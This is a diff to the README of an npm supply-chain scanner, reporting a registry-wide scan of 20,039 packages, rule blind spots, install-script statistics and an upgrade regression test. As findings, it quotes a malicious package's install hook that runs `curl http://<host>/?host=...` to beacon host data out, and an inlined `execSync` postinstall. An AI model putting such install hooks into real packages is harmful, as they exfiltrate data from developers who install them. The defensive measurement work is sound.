@@ -107,7 +107,7 @@ committed straight into the source tree, executing on folder-open with no
 
 ## Verification
 
-See `test/` (73 tests, `npm test`) and CHANGELOG.md for what was found and
+See `test/` (119 tests, `npm test`) and CHANGELOG.md for what was found and
 fixed while pressure-testing this against real installs instead of only
 the bundled demo.
 
@@ -137,6 +137,53 @@ nested `node_modules`, the same hidden behind a symlink, and a version
 bump that adds only an obfuscated payload with no literal token for the
 regex to match, three cases that previously slipped through.
 
+### Against 20,039 packages sampled across the registry
+
+Reading dependency trees tells you the population this runs on. It does not
+tell you what the rules are wrong about, because a tree is mostly popular,
+well-behaved packages. So the sample is stratified across the registry
+itself: the dependency closure of 245 well-known seeds, a uniform random
+draw from all 4,431,335 published names, scoped packages, recent publishes
+from the changes feed, and packages found by searching for native and
+install-script tooling. 22,696 tarballs fetched, 20,039 with source, 0 scan
+errors.
+
+Every evidence entry records the rule that produced it, so rules can be
+judged by what they match at scale rather than one finding at a time.
+Eleven were wrong; see CHANGELOG.md for each one and the measured effect of
+fixing it. Two are worth repeating here because they are blind spots rather
+than noise:
+
+**Lifecycle script commands were never scanned.** The command runs at
+install time but lives in package.json, so walking the package never
+reached it. That hid `xhjxhjtestrce123`, whose `preinstall` and
+`postinstall` both run `curl http://<host>/?host=...` and whose manifest
+reported no network access at all, and `iso-process`, whose postinstall
+inlines `require('child_process').execSync('npm i', {cwd: join('..',
+'esm')})`.
+
+**Files a package ships in `bin` were never read.** They carry no extension
+because the shell runs them through their shebang, and 375 of the 2,924
+packages that ship an executable, 12.8%, point `bin` at a file an
+extension-based filter skips. That file is the code a consumer runs
+directly. Reading it gave 26 of a 158-package sample a capability the
+manifest had missed; for four of them, `turbo` included, no file had been
+read at all and the reported risk score was 0.
+
+That second one also exposed a reporting problem worth naming: "nothing was
+read" and "nothing was found" produced the same empty manifest, and 12.5%
+of the sample reads that way. The manifest now says which it is.
+
+What the sample says about npm itself: 469 of 20,039 packages run something
+at install time, 2.3%. 185 run a JavaScript file, 111 are node-gyp or
+prebuild, 21 inline code with `node -e`, 8 only print a message, and
+exactly one pipes a download into a shell. 37 are CRITICAL and 202 HIGH.
+
+Throughput on that corpus: 161 packages/s single threaded, 37.5s for all
+20,039, after the profiling work in CHANGELOG.md. Every optimisation was
+verified by re-scanning the corpus and checking all 20,039 manifests are
+identical to the character.
+
 ### Does it survive a real dependency upgrade
 
 The thing that kills a CI security gate is not missed detections, it is
@@ -159,6 +206,25 @@ upgrade gets switched off in a week, so those classes are now reported
 without failing the build, while the signals that mark an actual attack
 path still fail it. The bundled worm fixture and every detection regression
 test still fail the gate exactly as before.
+
+That test is now a standing one, widened so it cannot be tuned against:
+82 popular packages, each at its last release before 2024-09-01, diffed
+against its current release. Two years and, for many of them, a major
+version apart.
+
+| | escalations |
+|---|---|
+| Before the registry-scale campaign below | 5 |
+| After | 3 |
+
+The two that went away were both the gate misreading generated code:
+`zod` 3 to 4 on a long IPv6 regex literal, `vite` 5 to 8 on the string
+`".npmrc"` inside a bundled list of config filenames. Of the three that
+remain, `prisma` is correct, its `preinstall` really did change across the
+major and it began reading `PRISMA_PLATFORM_AUTH_FILE`, and `fastify`
+reports a real read of `process.env.GITHUB_TOKEN` in
+`scripts/validate-ecosystem-links.js`, a repository CI script it publishes
+inside its tarball.
 
 ### On a realistic production tree
 
